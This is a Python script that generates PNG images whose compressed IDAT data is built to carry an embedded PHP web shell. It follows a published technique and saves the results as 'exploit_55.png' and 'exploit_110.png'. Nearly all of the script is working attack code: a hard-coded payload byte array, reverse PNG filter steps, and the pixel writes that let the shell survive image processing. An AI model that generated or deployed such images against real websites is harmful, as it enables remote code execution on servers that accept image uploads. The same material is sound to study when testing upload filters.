# Based on the work of presented in this article: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
# Author: Antonin PARROT 
# https://github.com/antoninparrot

import numpy as np
import matplotlib.pyplot as plt


p = [0xa3, 0x9f, 0x67, 0x54, 0x6f, 0x2c, 0x24, 0x15, 0x2b, 0x11, 0x67, 0x12, 0x54, 0x6f, 0x11, 0x2e, 0x29, 0x15, 0x2b, 0x21, 0x67, 0x22, 0x6b, 0x6f, 0x5f, 0x53, 0x10,     0x50,0x51,0xf4,0x0c,0x9c,0xeb,0x84,0xe1,0xd8,0x94,0x03,0xf5,0x2e,0x97,0x48,0x2f,0x50,0xe0,0xd0,0x02,0xc9,0x01,0x32,0xa9,0x3c,0x5c,0xb1,0x19,0x6e,0x6c,0xb1,0x0b,0xe1,0xd6,0x17,0x1c,0x8f,0x1b,0x14,     0,0,0]
p2 = [0xa3, 0x9f, 0x67, 0x54, 0x6f, 0x2c, 0x24, 0x15, 0x2b, 0x11, 0x67, 0x12, 0x54, 0x6f, 0x11, 0x2e, 0x29, 0x15, 0x2b, 0x21, 0x67, 0x22, 0x6b, 0x6f, 0x5f, 0x53, 0x10,     0x50,0x51,0xf4,0x0c,0x9c,0xeb,0x84,0xe1,0xd8,0x94,0x03,0xf5,0x2e,0x97,0x48,0x2f,0x50,0xe0,0xd0,0x02,0xc9,0x01,0x32,0xa9,0x3c,0x5c,0xb1,0x19,0x6e,0x6c,0xb1,0x0b,0xe1,0xd6,0x17,0x1c,0x8f,0x1b,0x14,     0,0,0]

s = len(p)
s2 = len(p2)
"""
We gonna use 2 filters to force the png to use filter 3. I will after concatenate both
"""
# Reverse Filter 1
for i in range(s):
	try:
		p[i+3] = (p[i+3] + p[i]) % 256
	except:
		None

# Reverse Filter 3
for i in range(s2):
	try:
		p2[i+3] = (p2[i+3] + int(p2[i] / 2)) % 256
	except:
		None

word = p + p2
n = len(word)

#Image with shape 55x55

image = np.zeros((55, 55, 3), dtype=np.uint8)
for y in range(0,n,3):
	r = word[y]
	g = word[y+1]
	b = word[y+2]
	image[0,round(y/3)] = [r,g,b]
plt.imsave('exploit_55.png', image)

#Image with shape 110x110

image = np.zeros((110, 110, 3), dtype=np.uint8)
for y in range(0,n,3):
	r = word[y]
	g = word[y+1]
	b = word[y+2]
	image[0,round(y/3)*2] = [r,g,b]
	image[0,round(y/3)*2+1] = [r,g,b]
	image[1,round(y/3)*2] = [r,g,b]
	image[1,round(y/3)*2+1] = [r,g,b]
plt.imsave('exploit_110.png', image)
